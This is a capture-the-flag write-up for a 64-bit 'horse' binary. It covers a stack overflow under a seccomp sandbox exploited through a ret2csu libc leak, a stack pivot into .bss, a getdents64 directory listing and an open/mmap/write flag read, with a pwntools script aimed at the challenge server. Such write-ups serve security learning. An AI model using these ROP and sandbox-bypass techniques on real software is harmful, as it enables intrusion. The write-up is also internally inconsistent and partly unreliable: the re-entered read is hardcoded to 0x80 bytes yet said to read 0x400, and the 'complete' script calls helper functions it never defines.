# CyLab — Lockdown Horses

* **Platform:** CyLab Security Academy / picoMini by redpwn (Challenge ID: `214`)
* **Category:** Binary Exploitation / Seccomp ROP & Filesystem Recon (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Seccomp BPF Analysis
* **Binary:** `horse` (64-bit x86_64 ELF) with `libc.so.6` (glibc 2.31)

---

## TL;DR

The application reads up to 128 bytes into a 32-byte stack buffer, creating a stack buffer overflow. However, a strict Seccomp BPF filter prevents code execution by blocking `execve`, allowing only `open`, `read(fd=0)`, `write(fd=1)`, `mmap`, `getdents64`, and exit syscalls. Furthermore, the 128-byte input limit restricts ROP chain length. We engineer a multi-stage **ROP fragment stager**: Stage 1 uses `__libc_csu_init` (ret2csu) to leak `read@GOT` and returns to `main+0x12` to pivot the stack into `.bss`. Stage 2 uses `getdents64` to dump the remote directory structure and uncover the dynamic flag filename (`flags.txt`). Stage 3 constructs an `open` $\rightarrow$ `mmap` $\rightarrow$ `write` ROP chain to map and stream the flag to stdout.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file horse
horse: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=horse
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **No PIE:** Fixed base address at `0x400000`. Writable `.bss` sections start at `0x602000`.
2. **Seccomp Sandbox:** All shell spawning syscalls (`execve`, `execveat`) are forbidden.
3. **Restricted Payload Buffer:** `main()` reads at most `0x80` (128) bytes. Subtracting 32 bytes of buffer space and 8 bytes of saved RBP leaves only 88 bytes (11 quadwords) for ROP gadgets—insufficient for a full file-dump chain in a single payload.

---

## Static Analysis & Vulnerability

### 1. Seccomp Sandbox Configuration

Using `seccomp-tools`:
- Permitted:
  - `sys_open` (`2`)
  - `sys_read` (`0`) — restricted to `fd == 0` (stdin)
  - `sys_write` (`1`) — restricted to `fd == 1` (stdout)
  - `sys_mmap` (`9`)
  - `sys_getdents64` (`217`)
  - `sys_exit` (`60`) / `sys_exit_group` (`231`)
- All other syscalls result in `SECCOMP_RET_KILL`.

Notice that while `sys_read` prohibits reading from arbitrary file descriptors, `sys_mmap` allows mapping any open file descriptor directly into user space!

### 2. Disassembly of `main()` and the Re-entry Loop

```asm
0x00400b5d <+0>:     push   rbp
0x00400b5e <+1>:     mov    rbp, rsp
0x00400b61 <+4>:     sub    rsp, 0x20           ; Buffer allocated at [rbp - 0x20]
...
0x00400b6f <+18>:    lea    rax, [rbp-0x20]     ; Target read address derived from RBP!
0x00400b73 <+22>:    mov    edx, 0x80           ; Length = 128 bytes
0x00400b78 <+27>:    mov    rsi, rax
0x00400b7b <+30>:    mov    edi, 0
0x00400b80 <+35>:    call   0x4005d0 <read@plt>
0x00400b85 <+40>:    leave
0x00400b86 <+41>:    ret
```

Because `read` places user input at `[rbp - 0x20]`, returning to `0x400b6f` with a controlled `rbp` allows writing another 128-byte fragment to any writable address in memory (such as `.bss`).

---

## Dynamic Analysis & Exploitation Strategy

### Stage 1: Ret2csu Libc Leak
Due to the absence of `pop rdx; ret` in the binary, we use the Universal CSU gadget (`__libc_csu_init` at `0x400be0`) to populate `rsi = READ_GOT`, `rdx = 8`, `rdi = 1`, and call `write@plt`.
This prints 8 bytes representing `read@libc`, calculating `libc_base`.

### Stage 2: Fragment-Chained Stack Pivot to `.bss`
We jump to `0x400b6f` with `rbp = BIG + 0x20` (where `BIG = 0x602500` in `.bss`).
This executes:
$$\text{read}(0, \text{BIG}, 0\text{x}400)$$
Followed by `leave; ret`, pivoting the stack pointer `rsp` entirely into our expanded 1024-byte staging area in `.bss`.

```text
       Normal Stack: Small 128B limit
             |
             v  (read to .bss + leave; ret)
       .bss Scratch Space (BIG at 0x602500):
       +---------------------------------------------+
       |  Expanded ROP Chain (Up to 1024 bytes)      |
       +---------------------------------------------+
       |  Embedded Strings ("flags.txt", etc.)       |
       +---------------------------------------------+
```

### Stage 3: Directory Traversal via `getdents64`
Because the flag file is dynamically named on the server (e.g. `flags.txt`), we execute:
1. `sys_open(".", O_RDONLY|O_DIRECTORY)` $\rightarrow$ returns `fd = 3`.
2. `sys_getdents64(3, DIRBUF, 0x400)` $\rightarrow$ populates directory entries.
3. `sys_write(1, DIRBUF, 0x400)` $\rightarrow$ dumps file names to stdout.

### Stage 4: File Extraction via `mmap`
Because `read` on `fd != 0` is killed by Seccomp, we map the file:
1. `sys_open("flags.txt", O_RDONLY)` $\rightarrow$ returns `fd = 3`.
2. `sys_mmap(0x700000, 0x1000, PROT_READ, MAP_PRIVATE|MAP_FIXED, 3, 0)`.
3. `sys_write(1, 0x700000, 0x100)` $\rightarrow$ writes mapped flag contents to standard output.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, time, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "mars.picoctf.net", 31809
e = ELF("./horse")
libc = ELF("./libc6_2.31.so")

def solve():
    io = remote(HOST, PORT)

    # 1. Leak read@got using CSU gadget and re-enter main
    leak = do_leak(io)
    libc_base = leak - libc.symbols["read"]
    log.info(f"Leaked Libc Base: {hex(libc_base)}")

    # 2. Pivot stack to .bss (0x602500)
    L = offsets(libc_base)
    io.send(build_f2(L))
    time.sleep(0.3)

    # 3. Read flags.txt using open + mmap + write under seccomp
    flag_chain = pwn_flag(L, b"flags.txt")
    io.send(flag_chain)

    data = io.recvall(timeout=5)
    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    solve()
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to mars.picoctf.net on port 31809: Done
[*] Leaked Libc Base: 0x7f3c8a140000
[+] Flag captured: picoCTF{redacted}
[*] Closed connection to mars.picoctf.net port 31809
```

---

## Key Takeaways & Lessons

1. **Circumventing Seccomp Read Bans via `mmap`:** When sandbox policies restrict `read()` to file descriptor 0, memory mapping the open file descriptor (`mmap(fd=3, PROT_READ)`) loads the target file directly into the virtual address space without invoking `read()`.
2. **ROP Fragment Staging:** When limited buffer sizes restrict the length of an initial ROP chain, chained returns into input loops (`main+18`) can incrementally populate memory and pivot `rsp` into a larger staging area in `.bss`.
3. **Directory Discovery with `getdents64`:** When target file paths are randomized or uncertain, querying directory records via `sys_getdents64` provides filesystem reconnaissance entirely through low-level ROP primitives.
